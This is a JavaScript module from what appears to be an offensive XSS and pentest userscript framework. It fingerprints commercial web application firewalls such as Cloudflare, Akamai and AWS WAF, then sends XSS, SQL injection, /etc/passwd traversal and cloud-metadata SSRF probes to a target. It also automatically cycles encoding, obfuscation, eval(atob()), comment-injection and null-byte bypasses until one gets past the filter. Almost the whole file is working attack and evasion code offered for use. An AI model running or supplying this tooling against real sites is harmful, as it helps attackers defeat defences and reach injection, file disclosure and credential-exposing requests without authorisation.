/**
 * ════════════════════════════════════════════════════════════════════════════
 * WAFDetector.js - WAF/IPS Detection & Bypass Engine
 * ════════════════════════════════════════════════════════════════════════════
 * Part of Elite Pentest Framework 2025
 * GitHub: https://github.com/Nevrkin/Another-XSS/blob/main/modules/WAFDetector.js
 */

class WAFDetector {
  constructor() {
    this.version = '1.0.0';
    this.wafSignatures = this.initWAFSignatures();
    this.detectedWAF = null;
    this.detectedVersion = null;
    this.bypassTechniques = this.initBypassTechniques();
    console.log(`[WAFDetector v${this.version}] Module loaded`);
  }

  /**
   * Initialize comprehensive WAF signatures
   */
  initWAFSignatures() {
    return {
      cloudflare: {
        name: 'Cloudflare',
        headers: ['cf-ray', 'cf-request-id', '__cfduid', 'cf-cache-status'],
        body: ['cloudflare', 'cf-browser-verification', 'attention required', 'ray id'],
        cookies: ['__cfduid', '__cflb'],
        status: [403, 503, 520, 521, 522, 523, 524],
        severity: 'high'
      },
      
      akamai: {
        name: 'Akamai',
        headers: ['akamai-grn', 'akamai-origin-hop', 'x-akamai-'],
        body: ['akamai', 'reference #', 'reference&nbsp;#'],
        status: [403],
        severity: 'high'
      },

      aws_waf: {
        name: 'AWS WAF',
        headers: ['x-amzn-requestid', 'x-amzn-errortype', 'x-amz-'],
        body: ['aws waf', 'request blocked', 'accessdeniedexception'],
        status: [403],
        severity: 'high'
      },

      imperva: {
        name: 'Imperva Incapsula',
        headers: ['x-iinfo', 'x-cdn'],
        body: ['imperva', 'incapsula', '_incap_', 'incident id'],
        cookies: ['incap_ses_', 'visid_incap_'],
        status: [403],
        severity: 'high'
      },

      f5_asm: {
        name: 'F5 BIG-IP ASM',
        headers: ['x-cnection', 'x-wa-info'],
        body: ['the requested url was rejected', 'support id', 'f5-bigip'],
        status: [403, 406, 419],
        severity: 'high'
      },

      modsecurity: {
        name: 'ModSecurity',
        headers: ['x-mod-security', 'mod_security'],
        body: ['mod_security', 'this error was generated by mod_security', 'not acceptable'],
        status: [403, 406, 501],
        severity: 'medium'
      },

      wordfence: {
        name: 'Wordfence',
        headers: ['x-wordfence'],
        body: ['wordfence', 'generated by wordfence', 'your access to this service has been limited'],
        cookies: ['wfvt_', 'wordfence'],
        status: [403, 503],
        severity: 'medium'
      },

      sucuri: {
        name: 'Sucuri CloudProxy',
        headers: ['x-sucuri-id', 'x-sucuri-cache'],
        body: ['sucuri', 'access denied - sucuri website firewall', 'questions? security@sucuri.net'],
        status: [403],
        severity: 'medium'
      },

      barracuda: {
        name: 'Barracuda',
        headers: ['x-barracuda-'],
        body: ['barracuda', 'you have been blocked'],
        status: [403],
        severity: 'high'
      },

      fortiweb: {
        name: 'FortiWeb',
        headers: ['fortigate', 'fortinet'],
        body: ['fortiweb', 'fortigate'],
        status: [403],
        severity: 'high'
      },

      dotdefender: {
        name: 'DotDefender',
        headers: ['x-dotdefender-denied'],
        body: ['dotdefender', 'applicure'],
        status: [403],
        severity: 'medium'
      },

      cloudfront: {
        name: 'CloudFront',
        headers: ['x-amz-cf-id', 'x-amz-cf-pop', 'via'],
        body: ['cloudfront'],
        status: [403, 502, 503, 504],
        severity: 'medium'
      }
    };
  }

  /**
   * Initialize bypass techniques
   */
  initBypassTechniques() {
    return {
      encoding: {
        url_encode: (payload) => encodeURIComponent(payload),
        
        double_url_encode: (payload) => encodeURIComponent(encodeURIComponent(payload)),
        
        unicode: (payload) => {
          return payload.split('').map(c => {
            if (c.match(/[a-zA-Z0-9]/)) {
              return '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4);
            }
            return c;
          }).join('');
        },
        
        hex: (payload) => {
          return payload.split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
        },
        
        html_entities: (payload) => {
          return payload.split('').map(c => '&#' + c.charCodeAt(0) + ';').join('');
        },
        
        mixed_encoding: (payload) => {
          return payload.split('').map((c, i) => {
            if (i % 2 === 0) return '%' + c.charCodeAt(0).toString(16);
            return c;
          }).join('');
        }
      },

      case_manipulation: {
        random_case: (payload) => {
          return payload.split('').map(c => 
            Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()
          ).join('');
        },
        
        alternating_case: (payload) => {
          return payload.split('').map((c, i) => 
            i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()
          ).join('');
        }
      },

      comment_injection: {
        mysql: (payload) => {
          return payload.replace(/\s+/g, '/**/');
        },
        
        multiline: (payload) => {
          return payload.replace(/\s+/g, '/*\n*/');
        },
        
        inline: (payload) => {
          return payload.replace(/\s+/g, '/**_**/');
        }
      },

      whitespace_manipulation: {
        tabs: (payload) => payload.replace(/\s+/g, '\t'),
        
        newlines: (payload) => payload.replace(/\s+/g, '\n'),
        
        carriage_return: (payload) => payload.replace(/\s+/g, '\r'),
        
        mixed: (payload) => {
          return payload.replace(/\s+/g, () => [' ', '\t', '\n', '\r'][Math.floor(Math.random() * 4)]);
        }
      },

      concatenation: {
        sql_concat: (keyword) => {
          // UNION -> UN'+'ION
          const mid = Math.floor(keyword.length / 2);
          return keyword.substring(0, mid) + "'+'"+  keyword.substring(mid);
        },
        
        double_quotes: (keyword) => {
          const mid = Math.floor(keyword.length / 2);
          return keyword.substring(0, mid) + '"+' + keyword.substring(mid);
        }
      },

      obfuscation: {
        xss_with_backticks: (payload) => {
          return payload.replace(/alert\(/g, 'self[`ale`+`rt`](');
        },
        
        xss_with_eval: (payload) => {
          const encoded = btoa(payload);
          return `eval(atob('${encoded}'))`;
        },
        
        sql_char: (keyword) => {
          return keyword.split('').map(c => `CHAR(${c.charCodeAt(0)})`).join('+');
        }
      },

      null_byte: {
        append: (payload) => payload + '%00',
        prepend: (payload) => '%00' + payload,
        middle: (payload) => {
          const mid = Math.floor(payload.length / 2);
          return payload.substring(0, mid) + '%00' + payload.substring(mid);
        }
      }
    };
  }

  /**
   * Detect WAF by sending test payloads and analyzing responses
   */
  async detect(url) {
    console.log('[WAFDetector] Starting detection...');

    const testPayloads = [
      { payload: '"><script>alert(1)</script>', type: 'xss' },
      { payload: "' OR '1'='1' --", type: 'sqli' },
      { payload: '../../../etc/passwd', type: 'lfi' },
      { payload: 'http://169.254.169.254/latest/meta-data/', type: 'ssrf' }
    ];

    const results = new Map();

    // First, get baseline response
    try {
      const baseline = await this.makeRequest(url);
      console.log('[WAFDetector] Baseline captured');
    } catch (error) {
      console.error('[WAFDetector] Failed to capture baseline:', error);
    }

    // Test with each payload
    for (const test of testPayloads) {
      try {
        const testUrl = new URL(url);
        testUrl.searchParams.set('test', test.payload);
        
        const response = await this.makeRequest(testUrl.toString());
        
        // Check each WAF signature
        for (const [wafName, signature] of Object.entries(this.wafSignatures)) {
          let score = 0;

          // Check headers
          for (const header of signature.headers) {
            if (response.headers.toLowerCase().includes(header.toLowerCase())) {
              score += 30;
            }
          }

          // Check body content
          for (const pattern of signature.body) {
            if (response.body.toLowerCase().includes(pattern.toLowerCase())) {
              score += 40;
            }
          }

          // Check cookies
          if (signature.cookies) {
            for (const cookie of signature.cookies) {
              if (response.headers.toLowerCase().includes(cookie.toLowerCase())) {
                score += 25;
              }
            }
          }

          // Check status code
          if (signature.status.includes(response.status)) {
            score += 20;
          }

          if (score > 0) {
            results.set(wafName, (results.get(wafName) || 0) + score);
          }
        }

        // Small delay between requests
        await this.sleep(500);
      } catch (error) {
        console.error(`[WAFDetector] Error testing ${test.type}:`, error);
      }
    }

    // Determine detected WAF
    if (results.size > 0) {
      const sorted = [...results.entries()].sort((a, b) => b[1] - a[1]);
      const [detectedWAF, score] = sorted[0];
      
      if (score >= 50) {
        this.detectedWAF = detectedWAF;
        const wafInfo = this.wafSignatures[detectedWAF];
        
        console.log(`[WAFDetector] ✓ Detected: ${wafInfo.name} (confidence: ${score}%, severity: ${wafInfo.severity})`);
        
        return {
          detected: true,
          waf: wafInfo.name,
          id: detectedWAF,
          confidence: score,
          severity: wafInfo.severity
        };
      }
    }

    console.log('[WAFDetector] No WAF detected');
    return { detected: false };
  }

  /**
   * Apply bypass technique to payload
   */
  applyBypass(payload, technique = 'auto', vulnerabilityType = 'xss') {
    if (!payload) return payload;

    if (technique === 'auto') {
      // Auto-select based on detected WAF
      if (this.detectedWAF) {
        return this.autoBypass(payload, vulnerabilityType);
      }
      return payload;
    }

    // Apply specific technique
    const [category, method] = technique.split('.');
    
    if (this.bypassTechniques[category] && this.bypassTechniques[category][method]) {
      try {
        return this.bypassTechniques[category][method](payload);
      } catch (error) {
        console.error('[WAFDetector] Bypass technique failed:', error);
        return payload;
      }
    }

    return payload;
  }

  /**
   * Automatically select best bypass for detected WAF
   */
  autoBypass(payload, vulnerabilityType) {
    const wafBypass = {
      modsecurity: ['encoding.double_url_encode', 'comment_injection.mysql'],
      f5_asm: ['case_manipulation.random_case', 'encoding.mixed_encoding'],
      cloudflare: ['obfuscation.xss_with_backticks', 'case_manipulation.alternating_case'],
      imperva: ['encoding.unicode', 'whitespace_manipulation.mixed'],
      wordfence: ['encoding.hex', 'comment_injection.inline'],
      aws_waf: ['encoding.double_url_encode', 'obfuscation.xss_with_eval']
    };

    const techniques = wafBypass[this.detectedWAF] || [];
    
    if (techniques.length > 0) {
      // Apply first matching technique
      const technique = techniques[0];
      console.log(`[WAFDetector] Applying bypass: ${technique} for ${this.detectedWAF}`);
      return this.applyBypass(payload, technique, vulnerabilityType);
    }

    return payload;
  }

  /**
   * Get all available bypass techniques
   */
  getBypassTechniques() {
    const techniques = [];
    
    for (const [category, methods] of Object.entries(this.bypassTechniques)) {
      for (const method of Object.keys(methods)) {
        techniques.push({
          id: `${category}.${method}`,
          category: category,
          method: method,
          name: `${category} - ${method.replace(/_/g, ' ')}`
        });
      }
    }

    return techniques;
  }

  /**
   * Test multiple bypass techniques
   */
  async testBypass(url, parameter, payload, vulnerabilityType) {
    console.log(`[WAFDetector] Testing bypass techniques for ${vulnerabilityType}...`);

    const results = [];
    const techniques = this.getBypassTechniques();

    for (const technique of techniques) {
      try {
        const bypassedPayload = this.applyBypass(payload, technique.id, vulnerabilityType);
        
        const testUrl = new URL(url);
        testUrl.searchParams.set(parameter, bypassedPayload);

        const response = await this.makeRequest(testUrl.toString());

        // Check if bypass was successful (not blocked)
        const wasBlocked = this.isBlocked(response);
        
        results.push({
          technique: technique.name,
          payload: bypassedPayload,
          blocked: wasBlocked,
          status: response.status,
          success: !wasBlocked
        });

        if (!wasBlocked) {
          console.log(`[WAFDetector] ✓ Bypass successful: ${technique.name}`);
        }

        await this.sleep(500);
      } catch (error) {
        console.error(`[WAFDetector] Error testing ${technique.name}:`, error);
      }
    }

    const successfulBypasses = results.filter(r => r.success);
    console.log(`[WAFDetector] Found ${successfulBypasses.length} successful bypasses`);

    return results;
  }

  /**
   * Check if response indicates blocking
   */
  isBlocked(response) {
    const blockStatuses = [403, 406, 419, 503];
    
    if (blockStatuses.includes(response.status)) {
      return true;
    }

    const blockIndicators = [
      /blocked/i, /denied/i, /forbidden/i, /rejected/i,
      /security/i, /firewall/i, /protection/i, /violation/i
    ];

    for (const pattern of blockIndicators) {
      if (pattern.test(response.body) || pattern.test(response.headers)) {
        return true;
      }
    }

    return false;
  }

  /**
   * Generate WAF evasion report
   */
  generateReport() {
    if (!this.detectedWAF) {
      return 'No WAF detected';
    }

    const waf = this.wafSignatures[this.detectedWAF];
    const techniques = this.getBypassTechniques();

    return {
      waf: waf.name,
      severity: waf.severity,
      recommendedBypasses: techniques.slice(0, 5).map(t => t.name),
      description: `${waf.name} detected. Recommend testing with encoding and obfuscation techniques.`
    };
  }

  /**
   * Make HTTP request
   */
  async makeRequest(url, method = 'GET', data = null) {
    return new Promise((resolve, reject) => {
      GM_xmlhttpRequest({
        method: method,
        url: url,
        data: data,
        timeout: 10000,
        onload: (response) => {
          resolve({
            status: response.status,
            headers: response.responseHeaders,
            body: response.responseText
          });
        },
        onerror: reject,
        ontimeout: () => reject(new Error('Timeout'))
      });
    });
  }

  /**
   * Sleep helper
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
  module.exports = WAFDetector;
}
